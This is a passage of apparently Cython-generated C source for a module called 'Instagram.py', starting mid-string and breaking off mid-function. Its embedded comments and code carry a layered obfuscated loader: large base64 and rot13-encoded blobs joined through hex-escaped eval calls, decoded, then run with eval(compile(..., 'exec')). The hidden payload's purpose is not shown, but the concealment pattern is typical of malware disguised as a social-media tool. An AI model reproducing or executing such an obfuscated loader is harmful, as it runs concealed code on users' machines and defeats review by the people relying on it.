XYTgwTS9USHZlTWhhTjBGM3FFTE1lZUdMS3MybnhrL2dHcFFuTnpSYzh1VFhadVdISE1KdjhKUWoxamdkVzIxbDdjaklXUWZvYzNHampYV3lMdEM5MmtHSDZ3WjlyZ2UwclE3dzkvWUxrTi9vWmdBaytxcW9aMGhzRDYxNEJWaC9QNjJEUVJwN3JhdDlkT1YvNUtkeHRXVjNtVWMrTE1YZGUzZFBHeTFRWDExT2ZlMG5QeS8vb0NjODZBay9RQ082VEtYcDVucXFSL0tnSy9rb1JIZDczUEVkTklQZWpjOUFWd21TQ2RodU5SK3BCaHQwbGVDWGc1WUpHUGpJQkd6b3hpZVgvcXBkK09RM2Z1OERZY2RQR093TzdwMzI0TDRUa1YrcDVIUEtpalhnZnRKamorQTdYZmFkNjhwYVdjc3JPVG1WSktzVW1oWTJ3L0tyRlZYZmtFK2FGNTg4TDhOWFVSSkdzV1Q1enREMDZYMWpiakduRnBqS2h1OWlRblBtQzhPNlVsakw4SW5NNVBqazdQVGs5R3hxY21JbWRTSTVNenM1bkMxV0NzYmNkSklUbCtVNjlvTDJLYXBlM2duZ0tKeW9pUXJSbVZvWVEzRTFhY2YzMHR4cFRsNlEyT3pFNUZ0cVRpMHJHaHIvN1BUS0YzRzdBWTNndDNGdlFyNmtGT1NUTzBHWkp4ZXlySUZHK3ZpWXNJRnBoM0NDQjgwNGZPQncwTTg0QThzSloraVlwZEtCN0xMS0J5aDNiTXJXRDFBME5sMXpCcG1YYkJDbFFZWkEzcDN2SWRqbFdKMjBaM2tvMkdOT2tiVG5nVG96OWwxblBjbkNiNjl4aGpzVzJGTlFTY3ZPdzdIUEFMY1I1YjhDem44aWxCZHcxcWRiSEVYY0V2MVNETTdIQWQxVGlPQ2YrbjFQUlVRNndwOGVrK0wybXY5WEdsRXU0RVc1YmtTNUgrQnFsWUdyNEpJaDBZb0wrdjNrRDVBTlFCRHhESkRQajJ2ckxMUW1nUjRSb1B1U2hYclNoN1pCZGFUT0lEcTBHbVpSZkl0WkMyQlF4SWl5R0dzRmJHa0IzSWtEQnJVQkJzWEEzdzZvMGRFdmJJcEc2eTRsNmVRbHdRMEQ3dm82djlxS3N5RHIzZ1pFNjBPMGJDWDVvSVdDV0lKZWtPc2poTnJ6eEZMMEV4SWUzdlNCeEFDWmlFcHNMOGkxVlgwVzd1MEhIK1hQUkFzQld4Ky9aeUhmYnhtdFVLL3R6dE1Na3A4L3pRRlB1TThUTGhzZGlHK1VOOGM5d1NNNTVFcGF1TmRaaDN0ZEQ4V05pRFZMMDc5ckN3V2J6ZEpZeUdmTjA2QkZRRE9rQzNGeWJxM0FpemJPNldnM3BOOGxpY1NaVEVhWm0yZ0tNQ0VBdGRMSzNSd0JDeVIyUTBHRmlDQ2xKbWIwcjJQb2kwOVpOZmRPVWRja2pabDdyT2xwcmJDTXNJajROa0V2by80dVp2d1FuZmZRK1YxMHZtbkRsLzQrNXRiTlVjc0ZySGtOQ3ZSN2VQLzNFVEc2bTRMUytUcGtlZ29hVFhPZ1UwczVKYXZ1amswQkczVnN6UEZhYk5rc2NzRUZIZXZhRFhKdHZ6eFNyckZYSStoOEZaeS9SQXk0U0tCemxKYTNVOUpOQUp4ajRyNW5vVjhPMkRnR1JsOXRCQnZzUG50c3NCbjIwVFQwMkM4QU40bi9YK0FtSXBqL2xFclJCN0o3Q0JiNm4xaVNBWUtjUllLY3ZSYms3TE1nWnovRkgyd0tPUTMzT09SWU9mdllnV2ZPK1REUXhzYWMvVTdxL3NkeWZ1eWVCWGIvNXU3WEcrQk85c0Rhd1YzZ2Jvamc3dEF1Y0hkNE43Z3JSQzJ3RzdNbmMrNlcxb1c3ZHlHMEcwTHoxcVR3MzFKNUhNT3JIc2o3ZHdGK0EwK0IzMEFEL0FhK0hMRGdGM3dFdjBlYXdxLytJVHE3UWEvK0VUcE5ZRmQvaEE1TlRmMERkSWpCL1NFNkNMaTM5UzMwYmdzNEFXTkJLZG9sbmJHcDRoT0FOQzJWMWx3dzFiK0Zqb3VkdmI4YzdOVC9TTmlGMHlGZHFuVmNWVGNXaTRyT3JnQWgxdlZLeWVCNEdyU0luZnRic0pjQmJWUjBsWEJYQzA5NlZIVlhXN2VsUExaRWpvN3ZJbkVqeEQ0QTUyZUlmTDhsb1BidVFxd0VQNFRaQVF0c240ZmJIUVZ1NThjMXdSL0hXMzhoa0g3UUNOSjFldTg0TXNJZi9UL1VlMy85ZWZYZXJSYld6anEyMGVvb1ZxZi90cTdHV1NmcHYxMEFoRzFHdTJYOVNUb3ZBR0VmQUdFbitBR21iUjJXdGNLeGwydXdVSllwMEluYmdkZHhuWGdRNG5hQmhndmd5bVE0RGhJUURubENEdFhweHJHbnkxcmcrVGJveURHbzIyNm5iZytUbnovckVVOTQwQk0rYlBTQSswS2RqdXhLSG5VbExiRHFyZU9LZlFCV3ZiOFVMWG5raHY3YjJOMS94NGFVcHRqMWR4M3Nlc2ZCcm04NFVFYnFjTVNhRGdZR1JnYW9xS3FZTCt5dUdhdjNTN21pcmlZZ3FKellIZjd1SVV6NFFIZE9oOHY4RXc3bGREeW5vTGxueHJKQ1NnZnpLdE9Vc2d0eTZRQ0ZjTmgwbWFPai9YTEUrM3YxaUxmSFZXMzFEOUQ1KytnOFVhM1YvOENCdUwrNVp1dGFSZG9rTU9td1IzdUhRZEpGTnI1UkFEUmJSNFcxR0tRSEp5MGJod1diaXRwcEpiMG1selliZlV5emZSc2M2R1ROTmR2VDRrWHhKSVE4bjJicjROamJqVGdXOU9MWVg2RWQ1dmVlbFdwV29iL2ZFL1IvaGJqWFZEcHNTU1BlK0lIK1JRQnZDT1dJQWdicU5NNGdJaGxyQWRwNjJ3aFpKQUJ0dzJNV0NVQi9heDF0amJBNFlWOEthYURSc2hWRDIwMUVYc0MwVnRaaGtiTk93Sjg0Mm1zaXBoSEo3U0xiZGRMbmdLS0ZDWFVDdTBsd0ZMajdlU01BZGRMbVBHVTMrZmxUOW5qQ2ZaN3dYaUkrZlhXMHlKWGM0MHBhU05QaHNYWGZyUWI2RzJ6ZE96ZCs2bENuM2VJOEMzVWFhRXFkQUZ2bWkzbEZLMWk2NjRqUGpMNjhqT3NEaUNUZzMxQldpa1h5eDE1ZUtSck9uWkMxNTRvdmszM2RBU3lIZTJuLzAyZmhsL1lYdmpxYVZLOXFObUNGT2U0VVNIWUxNaXE3QlFHL3B5QWpYVTF4eEFXT0JsNUZzTktBUnE3MWRUTUlDYm9RNHN4cjFaTWNCeHRjZXNTQkJpZkh2T3FtcTdvNk1KTjBaOXJjRFUrUDRjWFhzQ0NJRjY4SVhDa05pL1BFbW1JU3Jta01QWmRhT3V6T2duMnRFU3Z3RDQzanNjTEt1SzZtQ3ZodHB6UnhucmVGdEEvdG9lRHNaNEZiVURYNjM4RUVSRTlrWEREdHRNRm15Uy9BQzFnVk1zSXl2SFlaa1Z6SlBHNzR0dnpid3J0SEVTcTJBdmdKcWszSDFPcmRPQkFkMzFhb0txM1NpL3VZV2MreFJnUGx1cnV6RFVZL0tYaUZJaHQzcmNtZ'
 * destiny = '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'
 * joy = '\x72\x6f\x74\x31\x33'             # <<<<<<<<<<<<<<
 * trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
 * eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
 */
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_joy, __pyx_n_s_rot13) < 0) __PYX_ERR(0, 7, __pyx_L1_error)

  /* "Instagram.py":8
 * destiny = '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'
 * joy = '\x72\x6f\x74\x31\x33'
 * trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')             # <<<<<<<<<<<<<<
 * eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
 */
  __pyx_t_1 = __Pyx_Globals(); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = PyTuple_New(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_magic);
  __Pyx_GIVEREF(__pyx_n_s_magic);
  PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_magic);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_t_1);
  __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_eval, __pyx_t_2, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_Globals(); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = PyTuple_New(2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_kp_s_codecs_decode_love_joy);
  __Pyx_GIVEREF(__pyx_kp_s_codecs_decode_love_joy);
  PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_kp_s_codecs_decode_love_joy);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_3, 1, __pyx_t_2);
  __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_eval, __pyx_t_3, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyNumber_Add(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_Globals(); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = PyTuple_New(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 8, __pyx_L1_error)
